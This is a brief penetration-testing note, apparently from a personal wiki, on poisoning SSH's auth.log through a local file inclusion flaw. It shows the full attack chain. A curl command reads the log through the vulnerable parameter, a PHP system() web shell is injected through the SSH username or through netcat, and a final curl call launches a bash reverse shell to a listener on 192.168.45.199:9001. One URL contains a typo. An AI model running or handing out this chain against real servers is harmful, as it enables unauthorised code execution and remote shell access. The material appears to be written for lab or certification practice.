-- -
It's the same as for the [[Apache Log Poisoning]], but a different log file so different methodology.
### Enum
Say you found LFI in an #apache server, try to access the `auth.log` file in the web root
```bash
# You are looking for:
# /var/log/auth.log
curl http://192.168.249.80/console/file.php?file=/var/log/auth.log
```
### Exploit
##### Submit payload to log
Try to log into SSH with the payload as the user so it gets written to the log file, something like:
```bash
# This may not work
ssh '<?php system($_GET['c']); ?>'@192.168.249.80

# you can use netcat:
nc -nv <ip> 22
<?php system($_GET['cmd']); ?>
```
##### Use webshell to get a reverse shell
```bash
curl http://192.168.249.80/conosle/file.php?file=/var/log/auth.log&c=bash -i >& /dev/tcp/192.168.45.199/9001 0>&1
```